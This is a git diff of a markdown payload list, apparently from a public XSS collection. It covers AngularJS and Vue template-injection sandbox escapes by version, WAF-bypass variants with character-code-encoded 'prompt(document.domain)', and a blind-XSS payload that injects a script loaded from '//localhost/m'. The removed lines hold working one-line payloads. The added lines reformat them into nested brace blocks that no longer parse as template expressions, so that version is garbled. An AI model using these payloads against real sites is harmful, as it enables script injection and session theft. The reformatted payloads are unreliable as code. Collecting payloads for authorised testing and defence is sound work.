@@ -13,7 +13,11 @@ The following payloads are based on Client Side Template Injection.
 AngularJS 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)
 
 ```javascript
-{{constructor.constructor('alert(1)')()}}
+{
+  {
+    constructor.constructor("alert(1)")();
+  }
+}
 ```
 
 AngularJS 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)
@@ -27,9 +31,21 @@ Example available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.
 AngularJS 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)
 
 ```javascript
-{{0[a='constructor'][a]('alert(1)')()}}
-{{$eval.constructor('alert(1)')()}}
-{{$on.constructor('alert(1)')()}}
+{
+  {
+    (0)[(a = "constructor")][a]("alert(1)")();
+  }
+}
+{
+  {
+    $eval.constructor("alert(1)")();
+  }
+}
+{
+  {
+    $on.constructor("alert(1)")();
+  }
+}
 ```
 
 AngularJS 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)
@@ -54,101 +70,176 @@ AngularJS 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)
 AngularJS 1.5.0 - 1.5.8
 
 ```javascript
-{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+{
+  {
+    x = { y: "".constructor.prototype };
+    x["y"].charAt = [].join;
+    $eval("x=alert(1)");
+  }
+}
 ```
 
 AngularJS 1.4.0 - 1.4.9
 
 ```javascript
-{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+{
+  {
+    "a".constructor.prototype.charAt = [].join;
+    $eval("x=1} } };alert(1)//");
+  }
+}
 ```
 
 AngularJS 1.3.20
 
 ```javascript
-{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{
+  {
+    "a".constructor.prototype.charAt = [].join;
+    $eval("x=alert(1)");
+  }
+}
 ```
 
 AngularJS 1.3.19
 
 ```javascript
-{{
-    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
-    $eval('x=alert(1)//');
-}}
+{
+  {
+    "a"[
+      { toString: false, valueOf: [].join, length: 1, 0: "__proto__" }
+    ].charAt = [].join;
+    $eval("x=alert(1)//");
+  }
+}
 ```
 
 AngularJS 1.3.3 - 1.3.18
 
 ```javascript
-{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
-  'a'.constructor.prototype.charAt=[].join;
-  $eval('x=alert(1)//');  }}
+{
+  {
+    {
+    }
+    [{ toString: [].join, length: 1, 0: "__proto__" }].assign = [].join;
+    "a".constructor.prototype.charAt = [].join;
+    $eval("x=alert(1)//");
+  }
+}
 ```
 
 AngularJS 1.3.1 - 1.3.2
 
 ```javascript
-{{
-    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
-    'a'.constructor.prototype.charAt=''.valueOf;
-    $eval('x=alert(1)//');
-}}
+{
+  {
+    {
+    }
+    [{ toString: [].join, length: 1, 0: "__proto__" }].assign = [].join;
+    "a".constructor.prototype.charAt = "".valueOf;
+    $eval("x=alert(1)//");
+  }
+}
 ```
 
 AngularJS 1.3.0
 
 ```javascript
-{{!ready && (ready = true) && (
-      !call
-      ? $$watchers[0].get(toString.constructor.prototype)
-      : (a = apply) &&
-        (apply = constructor) &&
-        (valueOf = call) &&
-        (''+''.toString(
-          'F = Function.prototype;' +
-          'F.apply = F.a;' +
-          'delete F.a;' +
-          'delete F.valueOf;' +
-          'alert(1);'
-        ))
-    );}}
+{
+  {
+    !ready &&
+      (ready = true) &&
+      (!call
+        ? $$watchers[0].get(toString.constructor.prototype)
+        : (a = apply) &&
+          (apply = constructor) &&
+          (valueOf = call) &&
+          "" +
+            "".toString(
+              "F = Function.prototype;" +
+                "F.apply = F.a;" +
+                "delete F.a;" +
+                "delete F.valueOf;" +
+                "alert(1);"
+            ));
+  }
+}
 ```
 
 AngularJS 1.2.24 - 1.2.29
 
 ```javascript
-{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+{
+  {
+    "a".constructor.prototype.charAt = "".valueOf;
+    $eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");
+  }
+}
 ```
 
 AngularJS 1.2.19 - 1.2.23
 
 ```javascript
-{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
+{
+  {
+    toString.constructor.prototype.toString =
+      toString.constructor.prototype.call;
+    ["a", "alert(1)"].sort(toString.constructor);
+  }
+}
 ```
 
 AngularJS 1.2.6 - 1.2.18
 
 ```javascript
-{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+{
+  {
+    (_ = "".sub).call.call(
+      {}[($ = "constructor")].getOwnPropertyDescriptor(_.__proto__, $).value,
+      0,
+      "alert(1)"
+    )();
+  }
+}
 ```
 
 AngularJS 1.2.2 - 1.2.5
 
 ```javascript
-{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
+{
+  {
+    "a"[{ toString: [].join, length: 1, 0: "__proto__" }].charAt = "".valueOf;
+    $eval(
+      "x='" + (y = "if(!window\\u002ex)alert(window\\u002ex=1)") + eval(y) + "'"
+    );
+  }
+}
 ```
 
 AngularJS 1.2.0 - 1.2.1
 
 ```javascript
-{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+{
+  {
+    a = "constructor";
+    b = {};
+    a.sub.call.call(
+      b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub), a).value,
+      0,
+      "alert(1)"
+    )();
+  }
+}
 ```
 
 AngularJS 1.0.1 - 1.1.5 and Vue JS
 
 ```javascript
-{{constructor.constructor('alert(1)')()}}
+{
+  {
+    constructor.constructor("alert(1)")();
+  }
+}
 ```
 
 ### Advanced bypassing XSS
@@ -156,31 +247,189 @@ AngularJS 1.0.1 - 1.1.5 and Vue JS
 AngularJS (without `'` single and `"` double quotes) by [@Viren](https://twitter.com/VirenPawar_)
 
 ```javascript
-{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
+{
+  {
+    x = valueOf.name.constructor.fromCharCode;
+    constructor.constructor(x(97, 108, 101, 114, 116, 40, 49, 41))();
+  }
+}
 ```
 
 AngularJS (without `'` single and `"` double quotes and `constructor` string)
 
 ```javascript
-{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+{
+  {
+    x = 767015343;
+    y = 50986827;
+    a = x.toString(36) + y.toString(36);
+    b = {};
+    a.sub.call.call(
+      b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub), a).value,
+      0,
+      toString()[a].fromCharCode(
+        112,
+        114,
+        111,
+        109,
+        112,
+        116,
+        40,
+        100,
+        111,
+        99,
+        117,
+        109,
+        101,
+        110,
+        116,
+        46,
+        100,
+        111,
+        109,
+        97,
+        105,
+        110,
+        41
+      )
+    )();
+  }
+}
 ```
 
 ```javascript
-{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+{
+  {
+    x = 767015343;
+    y = 50986827;
+    a = x.toString(36) + y.toString(36);
+    b = {};
+    a.sub.call.call(
+      b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub), a).value,
+      0,
+      toString()[a].fromCodePoint(
+        112,
+        114,
+        111,
+        109,
+        112,
+        116,
+        40,
+        100,
+        111,
+        99,
+        117,
+        109,
+        101,
+        110,
+        116,
+        46,
+        100,
+        111,
+        109,
+        97,
+        105,
+        110,
+        41
+      )
+    )();
+  }
+}
 ```
 
 ```javascript
-{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+{
+  {
+    x = 767015343;
+    y = 50986827;
+    a = x.toString(36) + y.toString(36);
+    a.sub.call.call(
+      {}[a].getOwnPropertyDescriptor(a.sub.__proto__, a).value,
+      0,
+      toString()[a].fromCharCode(
+        112,
+        114,
+        111,
+        109,
+        112,
+        116,
+        40,
+        100,
+        111,
+        99,
+        117,
+        109,
+        101,
+        110,
+        116,
+        46,
+        100,
+        111,
+        109,
+        97,
+        105,
+        110,
+        41
+      )
+    )();
+  }
+}
 ```
 
 ```javascript
-{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+{
+  {
+    x = 767015343;
+    y = 50986827;
+    a = x.toString(36) + y.toString(36);
+    a.sub.call.call(
+      {}[a].getOwnPropertyDescriptor(a.sub.__proto__, a).value,
+      0,
+      toString()[a].fromCodePoint(
+        112,
+        114,
+        111,
+        109,
+        112,
+        116,
+        40,
+        100,
+        111,
+        99,
+        117,
+        109,
+        101,
+        110,
+        116,
+        46,
+        100,
+        111,
+        109,
+        97,
+        105,
+        110,
+        41
+      )
+    )();
+  }
+}
 ```
 
 AngularJS bypass Waf [Imperva]
 
 ```javascript
-{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)')()}}
+{
+  {
+    x = ["constr", "uctor"];
+    a = x.join("");
+    b = {};
+    a.sub.call.call(
+      b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub), a).value,
+      0,
+      "pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)"
+    )();
+  }
+}
 ```
 
 ### Blind XSS
@@ -194,7 +443,6 @@ AngularJS bypass Waf [Imperva]
     document.getElementsByTagName('body')[0].appendChild(_)")()
 }}
 ```
-
 
 Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger)
 
@@ -276,16 +524,32 @@ Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (Po
 1.5.9 - 1.5.11 by Jan Horn (Cure53, now works at Google Project Zero)
 
 ```javascript
-{{
-    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;
-    c.$eval=b;op=$root.$$phase;
-    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
-    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
-    B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\'script\\');_.src=\\'//localhost/m\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};");
-    m1=B($$asyncQueue.pop().expression,null,$root);
-    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
-    $eval('a(b.c)');[].push.apply=a;
-}}
+{
+  {
+    c = "".sub.call;
+    b = "".sub.bind;
+    a = "".sub.apply;
+    c.$apply = $apply;
+    c.$eval = b;
+    op = $root.$$phase;
+    $root.$$phase = null;
+    od = $root.$digest;
+    $root.$digest = {}.toString;
+    C = c.$apply(c);
+    $root.$$phase = op;
+    $root.$digest = od;
+    B = C(b, c, b);
+    $evalAsync(
+      "astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\'script\\');_.src=\\'//localhost/m\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};"
+    );
+    m1 = B($$asyncQueue.pop().expression, null, $root);
+    m2 = B(C, null, m1);
+    [].push.apply = m2;
+    a = "".sub;
+    $eval("a(b.c)");
+    [].push.apply = a;
+  }
+}
 ```
 
 ## Automatic Sanitization
@@ -300,7 +564,7 @@ However, it is possible to mark a value as trusted and prevent the automatic san
 - bypassSecurityTrustUrl
 - bypassSecurityTrustResourceUrl
 
-Example of a component using the unsecure method `bypassSecurityTrustUrl`:
+Example of a component using the insecure method `bypassSecurityTrustUrl`:
 
 ```
 import { Component, OnInit } from '@angular/core';
